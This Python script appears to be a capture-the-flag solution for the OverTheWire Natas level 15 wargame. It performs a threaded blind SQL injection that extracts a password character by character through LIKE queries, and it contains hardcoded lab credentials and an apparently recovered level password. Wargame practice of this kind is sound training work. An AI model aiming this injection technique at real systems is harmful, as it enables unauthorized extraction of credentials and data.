import requests
from multiprocessing.pool import ThreadPool
import string

#WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

def main():
  username = 'natas15'
  password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
  authorization = (username, password)
  authorized_get = lambda url: requests.get(url, auth=authorization)
  url = "http://natas15.natas.labs.overthewire.org/?username=natas16"
  
  result = authorized_get(url).text
  #print(result)
  #print("user exists" in result)

  def user_with_query(query):
    check, url = query
    if "user exists" in authorized_get(url).text[150:]:
      return check
    return None


  len_queries = [(i, f"{url}\" AND password LIKE \"{'_'*i}") for i in range(1,65)]

  # for url in sites:
  # print(sitesize(url))
  length = 0
  with ThreadPool(len(len_queries)) as pool:
    for result in pool.imap_unordered(user_with_query, len_queries):
      if result is not None:
        length = result
        break
  
  flag_chars = [""]*length
  possible = string.ascii_letters + string.digits
  for i in range(length):
    char_queries = [(poss, f"{url}\" AND password LIKE BINARY \"{'_'*i + poss + '_'*(length-i-1)}") for poss in possible]
    with ThreadPool(len(possible)) as pool:
      for result in pool.imap_unordered(user_with_query, char_queries):
        if result is not None:
          flag_chars[i] = result
          break
  print("".join(flag_chars))

if __name__ == "__main__":
  main()